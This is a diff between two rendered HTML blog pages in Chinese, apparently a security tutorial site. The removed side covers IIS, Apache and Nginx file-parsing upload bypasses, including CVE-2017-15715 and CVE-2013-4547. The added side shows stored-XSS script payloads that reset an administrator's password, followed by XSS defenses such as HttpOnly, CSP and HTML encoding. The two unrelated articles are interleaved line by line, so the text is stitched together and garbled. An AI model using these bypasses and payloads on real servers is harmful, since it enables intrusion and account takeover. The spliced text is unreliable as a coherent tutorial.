-<h2 id="8、中间件文件解析"><a href="#8、中间件文件解析" class="headerlink" title="8、中间件文件解析"></a>8、中间件文件解析</h2><h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a><strong>IIS解析漏洞</strong></h3><ul>
-<li><h4 id="文件解析："><a href="#文件解析：" class="headerlink" title="文件解析："></a>文件解析：</h4></li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">x.asp;.x.jpg
-iis5.x&#x2F;6.0中：文件名分号后不被解析：x.asp;.x.jpg可当作x.asp执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
+<p><strong>（4）存储型-注册插入<code>JS</code></strong></p>
 <ul>
-<li><h4 id="目录解析："><a href="#目录解析：" class="headerlink" title="目录解析："></a>目录解析：</h4></li>
+<li>后台管理由功能页面，可以查看注册用户的账号密码</li>
+<li>注册的账号密码改成<code>JS</code>代码</li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">iis5.x&#x2F;6.0目录解析：*.asp、*.asa、.cer、.cdx文件夹内任意文件当作asp执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><strong>上传文件固定文件名、目录无法创建，以上解析漏洞无用武之地。</strong></p>
+<p><strong>（5）存储型-借助修改密码重置管理员密码(GET)</strong></p>
 <ul>
-<li><h4 id="IIS7-X与Nginx解析漏洞一致"><a href="#IIS7-X与Nginx解析漏洞一致" class="headerlink" title="IIS7.X与Nginx解析漏洞一致"></a>IIS7.X与Nginx解析漏洞一致</h4></li>
+<li>前提：登录状态下通过访问一个地址就可以修改密码</li>
+<li>管理员登陆后台，访问了用户构造的<code>JS</code>代码。</li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">iis 7.0&amp;7.5 默认Fast-CGI开启，直接在url中图片地址后面输入&#x2F;x.php，会把正常图片当成php解析<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://127.0.0.1/api/change.php?p=123'</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>（6）存储型-借助修改密码重置管理员密码(POST)</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax(&#123;url:&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;api&#x2F;change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
-<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a><strong>Apache解析漏洞</strong></h3><ul>
-<li><h4 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）黑名单绕过"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）黑名单绕过" class="headerlink" title="Apache  HTTPD 换行解析漏洞（CVE-2017-15715）黑名单绕过"></a>Apache  HTTPD 换行解析漏洞（CVE-2017-15715）黑名单绕过</h4></li>
-</ul>
-<p>Apache HTTPD是一款<strong>HTTP服务器</strong>，它可以通过<strong>mod_php</strong>来运行PHP网页。其<strong>2.4.0~2.4.29</strong>版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
-<p>原理：解析漏洞根本原因就是**$** 这个符号，这个符号在<strong>正则表达式</strong>中是<strong>匹配字符串中结尾</strong>的位置，<strong>利用换行符使$ 与其匹配</strong>从而<strong>绕过    黑名单机制</strong>实现文件上传。</p>
-<p>验证逻辑对上传的文件正则匹配验证后缀名是否包含了php，因为解析漏洞的存在，这里<strong>不会过滤php%0a</strong>。</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 利用方式：</span>
-在上传时抓包，在x<span class="token operator">.</span>php （注意：非filename<span class="token operator">=</span>x<span class="token operator">.</span>php）中hex编码的php后一个插入<span class="token number">0</span>A。
-<span class="token comment"># 修改十六进制代码，可在php后加一个空格，将空格的十六进制20修改为0A</span>
-上传成功访问ip<span class="token operator">/</span>x<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>A页面回显出php的相关信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="5、XSS漏洞防御"><a href="#5、XSS漏洞防御" class="headerlink" title="5、XSS漏洞防御"></a>5、XSS漏洞防御</h2><p>（1）过滤一些危险字符，以及转义<code>&amp; &lt; &gt; &quot; &#39;</code> 等危险字符。自定义过滤函数引用。</p>
+<p>（2）<strong>设置会话Cookie的HTTP Only</strong>属性，解决Cookie被盗用。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//php5.2版本以上支持设置Http Only参数设置，在php.ini中：</span>
+session<span class="token operator">.</span>cookie_httponly <span class="token operator">=</span><span class="token number">1</span>
+<span class="token comment">//代码中开启全局Cookie的Http Only属性：</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"session.cookie_httponly"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
+<p>（3）<strong>设置CSP：内容安全策略(Content Security Policy)</strong></p>
+<p>开发者根据<strong>CSP</strong>的规范，去创建一些很严格的规则，比如说白名单策略，管理网站允许加载的内容。当网站<strong>加载了非预期的内容</strong>，浏览器会及时<strong>阻止并上报</strong>，减少出现安全风险时的损失。</p>
+<p><strong>CSP有两种指令方式：</strong></p>
 <ul>
-<li><h4 id="Apache-HTTPD-未知后缀解析漏洞"><a href="#Apache-HTTPD-未知后缀解析漏洞" class="headerlink" title="Apache HTTPD 未知后缀解析漏洞"></a>Apache HTTPD 未知后缀解析漏洞</h4></li>
+<li>HTTPheader：比如在<code>HTTP</code>的响应头中设置<code>Content-Security-Policy</code>的值。</li>
+<li>HTML：比如在<code>html</code>里插入<code>meta</code>标签来实现。<em>如果都设置的话，以HTTP响应头里的为准</em></li>
 </ul>
-<!--该漏洞与版本无关、属于用户配置不当造成的解析漏洞。-->
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//例：只允许加载本地源图片：</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Security-Policy:img-src 'self' "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">AddHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>php
-  
-<span class="token comment"># 解释：让Apache把PHP文件交给php_moudle解析，但是它与sethandler的区别是它的后缀不是用正则去匹配。所以在文件名的任何位置匹配到php，他都会让php_module解析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<span class="token comment">//例：加载所有源下的图片</span>
+<span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string double-quoted-string">"Content-Security-Policy"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"img-src*;"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过<strong>上传白名单</strong>的解析漏洞。</p>
-<p><strong>补充：利用此方法文件名需要基于本地上传为准</strong></p>
-<h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><ul>
-<li><h4 id="解析漏洞-nginx-conf配置不当"><a href="#解析漏洞-nginx-conf配置不当" class="headerlink" title="解析漏洞-nginx.conf配置不当"></a>解析漏洞-nginx.conf配置不当</h4></li>
-</ul>
-<p><em><strong>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞</strong></em></p>
-<p>在访问的文件后增加<code>/.php</code>后缀，被解析成PHP文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;uploadfiles&#x2F;nginx.png&#x2F;.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>（4）<strong>HTML实体</strong></p>
+<p>对用户输入的参数进行html编码。</p>
+<p>如php中的htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&amp;</span>			<span class="token operator">--</span><span class="token operator">></span>			<span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>	
+<span class="token operator">&lt;</span>			<span class="token operator">--</span><span class="token operator">></span>			<span class="token operator">&amp;</span>lt<span class="token punctuation">;</span>	
+<span class="token operator">></span>			<span class="token operator">--</span><span class="token operator">></span>			<span class="token operator">&amp;</span>gt<span class="token punctuation">;</span>	
+"			<span class="token operator">--</span><span class="token operator">></span>			<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<ul>
-<li><h4 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h4></li>
-</ul>
-<p><strong>影响版本：</strong>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
-<p>这个漏洞和代码执行没有太大关系，其主要原因是<strong>错误地解析了请求的URI</strong>，<strong>错误地获取到用户请求的文件名</strong>，导致出现权限绕过、代码执行的连带影响。</p>
-<p><strong>利用方式：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">1、我们上传一个“1.gif ”，注意后面的空格。
-	1.gif: &lt;?php phpinfo();?&gt;
-2、访问http:&#x2F;&#x2F;ip:8080&#x2F;uploadfiles&#x2F;1.gif[0x20][0x00].php，即可发现PHP已被解析。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
+<p>（5）<strong>使用XSS Filter</strong></p>
+<p>使用Filter拦截请求，将普通请求转化为包装过的可以处理XSS的自定义请求，之后获取参数时都会经过XSS处理。</p>
+<p>（6）输入内容长度控制等。</p>
 
                 
             </div>
@@ -668,7 +683,7 @@ iis5.x&#x2F;6.0中：文件名分号后不被解析：x.asp;.x.jpg可当作x.asp
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://jaasenyi.github.io/2022/02/22/wen-jian-shang-chuan-rao-guo/">http://jaasenyi.github.io/2022/02/22/wen-jian-shang-chuan-rao-guo/</a>
+                    <a href="http://jaasenyi.github.io/2022/04/07/xss-lou-dong/">http://jaasenyi.github.io/2022/04/07/xss-lou-dong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -710,8 +725,8 @@ iis5.x&#x2F;6.0中：文件名分号后不被解析：x.asp;.x.jpg可当作x.asp
                                     <span class="chip bg-color">web安全</span>
                                 </a>
                             
-                                <a href="/tags/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">文件类型漏洞</span>
+                                <a href="/tags/%E9%92%93%E9%B1%BC/">
+                                    <span class="chip bg-color">钓鱼</span>
                                 </a>
                             
                         </div>
@@ -1151,16 +1166,17 @@ iis5.x&#x2F;6.0中：文件名分号后不被解析：x.asp;.x.jpg可当作x.asp
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/02/28/java-ji-chu/">
+                <a href="/2022/04/07/xss-lou-dong/">
                     <div class="card-image">
                         
-                        <img src="/medias/banner/java.jpeg" class="responsive-img" alt="Java基础语法(Part-1)">
+                        <img src="/medias/banner/xss.jpeg" class="responsive-img" alt="XSS漏洞">
                         
-                        <span class="card-title">Java基础语法(Part-1)</span>
+                        <span class="card-title">XSS漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1170,26 +1186,31 @@ iis5.x&#x2F;6.0中：文件名分号后不被解析：x.asp;.x.jpg可当作x.asp
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-07
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Java%E7%AF%87/" class="post-category">
-                                    Java篇
+                            <a href="/categories/web%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    web漏洞
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Java/">
-                        <span class="chip bg-color">Java</span>
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%92%93%E9%B1%BC/">
+                        <span class="chip bg-color">钓鱼</span>
                     </a>
                     
                 </div>
@@ -1203,13 +1224,12 @@ iis5.x&#x2F;6.0中：文件名分号后不被解析：x.asp;.x.jpg可当作x.asp
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/15/wen-jian-bao-han/">
+                <a href="/2022/03/31/sql/">
                     <div class="card-image">
                         
+                        <img src="/medias/banner/sql.jpeg" class="responsive-img" alt="数据库注入">
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="文件包含漏洞介绍">
-                        
-                        <span class="card-title">文件包含漏洞介绍</span>
+                        <span class="card-title">数据库注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1220,7 +1240,7 @@ iis5.x&#x2F;6.0中：文件名分号后不被解析：x.asp;.x.jpg可当作x.asp
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-31
                             </span>
                         <span class="publish-author">
                             
@@ -1237,12 +1257,12 @@ iis5.x&#x2F;6.0中：文件名分号后不被解析：x.asp;.x.jpg可当作x.asp
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
+                    <a href="/tags/%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">注入</span>
                     </a>
                     
-                    <a href="/tags/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">文件类型漏洞</span>
+                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">
+                        <span class="chip bg-color">数据库</span>
                     </a>
                     
                 </div>
